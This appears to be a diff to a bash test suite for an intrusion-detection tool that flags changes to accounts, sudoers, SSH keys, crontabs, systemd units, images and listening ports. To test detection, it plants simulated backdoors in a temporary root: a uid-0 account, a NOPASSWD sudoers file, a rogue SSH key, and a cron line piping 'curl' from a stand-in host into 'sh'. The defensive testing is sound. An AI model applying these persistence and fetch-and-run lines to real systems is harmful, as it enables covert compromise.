@@ -8,6 +8,7 @@ pass=0; fail=0
 has()  { grep -F -- "$2" <<<"$3" >/dev/null && { pass=$((pass+1)); echo "  ok   $1"; } || { fail=$((fail+1)); echo "  FAIL $1 (no '$2')"; sed 's/^/       /' <<<"$3"; }; }
 none() { grep -F "FLAG" <<<"$2" >/dev/null && { fail=$((fail+1)); echo "  FAIL $1"; sed 's/^/       /' <<<"$2"; } || { pass=$((pass+1)); echo "  ok   $1"; }; }
 lacks() { grep -F -- "$2" <<<"$3" >/dev/null && { fail=$((fail+1)); echo "  FAIL $1 (found '$2')"; } || { pass=$((pass+1)); echo "  ok   $1"; }; }
+eq()   { [[ "$2" == "$3" ]] && { pass=$((pass+1)); echo "  ok   $1"; } || { fail=$((fail+1)); echo "  FAIL $1 (want '$2', got '$3')"; }; }
 
 R="$D/root"; mkdir -p "$R/etc/sudoers.d" "$R/etc/cron.d" "$R/var/spool/cron/crontabs" "$R/etc/systemd/system" "$R/home/op/.ssh" "$D/bin"
 cat > "$R/etc/passwd" <<'E'
@@ -62,25 +63,26 @@ echo "evil:x:0:0::/home/evil:/bin/bash" >> "$R/etc/passwd"; o=$(go)
 has "a new account that can log in (uid 0)" "account that can log in: new evil: uid 0" "$o"
 go --accept >/dev/null; o=$(go); none "accepted: quiet" "$o"
 
-sed -i 's/^docker:x:999:$/docker:x:999:op/' "$R/etc/group"; o=$(go); has "someone added to docker" "group docker: 1 added" "$o"; go --accept >/dev/null
-printf 'op ALL=(ALL) NOPASSWD: /usr/bin/tee\n' > "$R/etc/sudoers.d/zz-backdoor"; o=$(go); has "a new sudoers file" "sudoers: new zz-backdoor" "$o"; has "and its line" "+ op ALL=(ALL) NOPASSWD: /usr/bin/tee" "$o"; go --accept >/dev/null
+sed -i 's/^docker:x:999:$/docker:x:999:op/' "$R/etc/group"; o=$(go); has "someone added to docker" "group docker: added op" "$o"; go --accept >/dev/null
+printf 'op ALL=(ALL) NOPASSWD: /usr/bin/tee\n' > "$R/etc/sudoers.d/zz-backdoor"; o=$(go); has "a new sudoers file" "sudoers: new zz-backdoor" "$o"; has "and its line" "sudoers: new zz-backdoor: op ALL=(ALL) NOPASSWD: /usr/bin/tee" "$o"; go --accept >/dev/null
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvilKeyEvilKeyEvilKeyEvilKeyEvilKeyEvilKeyEv1 x@y" >> "$R/home/op/.ssh/authorized_keys"; o=$(go)
-has "a key added to authorized_keys" "ssh key op: 1 added" "$o"; go --accept >/dev/null
+has "a key added to authorized_keys" "ssh key op: added" "$o"; go --accept >/dev/null
 echo "* * * * * curl -s http://x.example/p | sh" > "$R/var/spool/cron/crontabs/www-data"; o=$(go); has "a crontab for the web user" "crontab: new /var/spool/cron/crontabs/www-data" "$o"; go --accept >/dev/null
 echo 'API_TOKEN=abc123 0 * * * * root /x' > "$R/etc/cron.d/tok"; o=$(go); lacks "a token in a crontab is masked" "abc123" "$o"; go --accept >/dev/null
-touch "$R/etc/systemd/system/kworker.service"; o=$(go); has "a new systemd unit" "systemd unit: 1 added" "$o"; go --accept >/dev/null
-echo "mariadb:11@sha256:bbb" >> "$D/docker.out"; o=$(go); has "a pulled image" "docker image: 1 added" "$o"; go --accept >/dev/null
-printf 'tcp LISTEN 0 5 0.0.0.0:4444 0.0.0.0:*\n' >> "$D/ports.out"; o=$(go); has "a new listener" "+ tcp 0.0.0.0:4444" "$o"; go --accept >/dev/null
+touch "$R/etc/systemd/system/kworker.service"; o=$(go); has "a new systemd unit" "systemd unit: added kworker.service" "$o"; go --accept >/dev/null
+echo "mariadb:11@sha256:bbb" >> "$D/docker.out"; o=$(go); has "a pulled image" "docker image: added mariadb:11@sha256:bbb" "$o"; go --accept >/dev/null
+printf 'tcp LISTEN 0 5 0.0.0.0:4444 0.0.0.0:*\n' >> "$D/ports.out"; o=$(go); has "a new listener" "listening port: added tcp 0.0.0.0:4444" "$o"; go --accept >/dev/null
 echo "op       pts/1        198.51.100.9     $NOW   still logged in" >> "$D/last.out"; o=$(go)
 has "a login from an address never seen for that account" "login: op from 198.51.100.9" "$o"
-o=$(go); lacks "the address is remembered after one night" "login: op from 198.51.100.9" "$o"
-o=$(go); none "and the node is quiet again" "$o"
+o=$(go); eq "the address is remembered after one night: no second finding for it" 1 "$(grep -c 'login: op from 198.51.100.9' <<<"$o")"
+go --accept >/dev/null; o=$(go); none "answered: the node is quiet again" "$o"
 printf 'exit 1\n' > "$D/bin/docker"; o=$(go); none "docker not answering is not 'every image removed'" "$o"
 sed -i 's/53601/53136/' "$D/ports.out" "$D/wg.out"; o=$(go); none "WireGuard's port changing at a reboot is not a new listener" "$o"
 old_baseline() { python3 -I -c 'import json,sys; f=sys.argv[1]; s=json.load(open(f)); s.pop("wg_excluded",None); s["ports"]=sorted(s["ports"]+sys.argv[2:]); json.dump(s,open(f,"w"))' "$D/st/state.json" "$@"; }
 old_baseline "udp 0.0.0.0:41000"; o=$(go); none "a baseline from before the WireGuard rule: its gone UDP port is not 'removed'" "$o"
 o=$(go); none "and stays quiet after that" "$o"
-old_baseline "tcp 0.0.0.0:9999"; o=$(go); has "the migration still flags a TCP listener that went away" "listening port: 1 removed" "$o"; go --accept >/dev/null
+old_baseline "tcp 0.0.0.0:9999"; o=$(go); has "a TCP listener that went away is information" "INFO listening port: removed tcp 0.0.0.0:9999" "$o"
+none "not a flag" "$o"
 has "the digest is kept on the node" '"lines"' "$(cat "$D/st/digest.json")"
 j() { python3 -I -c 'import json,sys; d=json.load(open(sys.argv[1])); print(eval(sys.argv[2], {"d": d}))' "$D/st/digest.json" "$1"; }
 has "the digest counts logins per account and address" "203.0.113.7=1" "$(j '",".join(f"{ip}={n}" for ip, n in d["logins"]["op"].items())')"
@@ -91,4 +93,29 @@ print(w.daily_mode(types.SimpleNamespace(daily=sys.argv[2], status=sys.argv[3]))
 mkdir -p "$D/jobs"; has "auto: the digest goes with alerts while no daily report runs" "send" "$(mode auto)"
 touch "$D/jobs/daily-report.status"; has "auto: the daily report carries it once its status file is there" "report" "$(mode auto)"
 has "an explicit setting wins" "send" "$(mode send)"
+
+echo "-- one finding at a time"
+printf 'exec cat "%s/docker.out"\n' "$D" > "$D/bin/docker"; go --accept >/dev/null
+rec() { python3 -I -c 'import json,sys; s=json.load(open(sys.argv[1])); r=[dict(v,id=k) for k,v in s.get("findings",{}).items() if sys.argv[2] in v["text"]]; print(r[0].get(sys.argv[3]) if r else "none")' "$D/st/state.json" "$1" "$2"; }
+touch "$R/etc/systemd/system/miner.service"; printf 'tcp LISTEN 0 5 0.0.0.0:5555 0.0.0.0:*\n' >> "$D/ports.out"
+o=$(go); has "two changes, two findings" "listening port: added tcp 0.0.0.0:5555" "$o"; has "the other" "systemd unit: added miner.service" "$o"
+IU=$(rec miner.service id); IP=$(rec 5555 id)
+o=$(go); eq "a finding keeps its id from run to run" "$IU" "$(rec miner.service id)"
+eq "the id is its kind and subject, not its wording" "$IU" "$(python3 -I -c 'import hashlib; print(hashlib.sha256(b"units\nminer.service|").hexdigest()[:10])')"
+o=$(go --accept "$IU" --nonce "$(rec 5555 nonce)"); rc=$?
+eq "--accept <id> with another finding's nonce is refused" "3 new" "$rc $(rec miner.service status)"
+o=$(go --accept "$IU"); has "--accept <id> takes that one" "accepted $IU: unit miner.service" "$o"
+eq "and only that one" "accepted new" "$(rec miner.service status) $(rec 5555 status)"
+o=$(go); lacks "the accepted one is quiet" "miner.service" "$o"; has "the other stays" "0.0.0.0:5555" "$o"
+has "the accepted unit is in the baseline" "miner.service" "$(python3 -I -c 'import json,sys; print(json.load(open(sys.argv[1]))["units"])' "$D/st/state.json")"
+lacks "the waiting listener is not" "5555" "$(python3 -I -c 'import json,sys; print(json.load(open(sys.argv[1]))["ports"])' "$D/st/state.json")"
+o=$(go --accept 0123456789); rc=$?; eq "an unknown id: nothing" 3 "$rc"
+o=$(go --reject "$IP" --no-alert); has "--reject <id> marks it not ours" "rejected $IP" "$o"
+o=$(go); has "a rejected finding stays open" "0.0.0.0:5555  [rejected $IP]" "$o"
+has "and the daily report sees it" '"status": "rejected"' "$(cat "$D/st/digest.json")"
+sed -i '/5555/d' "$D/ports.out"; o=$(go); none "gone from the node: gone" "$o"; eq "its record says so" gone "$(rec 5555 status)"
+lacks "a finding that went before it was accepted was never in the baseline: nothing removed" "5555" "$o"
+rm -f "$R/etc/systemd/system/miner.service"; o=$(go); none "an accepted unit that went away is not a flag" "$o"
+has "it is in the digest as information" "systemd unit: removed miner.service" "$(python3 -I -c 'import json,sys; print(json.load(open(sys.argv[1]))["info"])' "$D/st/digest.json")"
+lacks "the state holds no nonce outside the findings" "nonce" "$(cat "$D/st/digest.json")"
 echo "== $pass ok, $fail failed"; exit $(( fail > 0 ))
